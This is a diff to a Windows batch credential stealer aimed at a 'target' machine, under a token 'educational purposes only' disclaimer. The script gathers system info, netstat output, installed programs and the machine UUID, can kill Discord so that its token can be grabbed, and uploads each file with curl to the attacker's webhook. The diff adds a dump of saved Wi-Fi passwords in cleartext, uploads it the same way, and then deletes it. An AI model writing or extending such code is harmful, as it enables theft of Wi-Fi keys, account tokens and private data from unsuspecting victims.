@@ -3,7 +3,7 @@
 @echo off
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
-set webhook=YOURWEBHOOK
+set webhook=YOURTOKEN
 
 ::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
 set /a killdc = 0
@@ -27,7 +27,10 @@ echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
 systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
 wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
-
+for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
+    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
+   
+)
 
 :aftertesti
 
@@ -82,6 +85,7 @@ curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
 curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
+curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%
  
 
 ::grabbs the token
@@ -182,3 +186,4 @@ del %userprofile%\AppData\Local\Temp\programms.txt
 del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
 del %userprofile%\AppData\Local\Temp\uuid.txt
 del %userprofile%\AppData\Local\Temp\testtttt.ps1 
+del %userprofile%\AppData\Local\Temp\wlan.txt
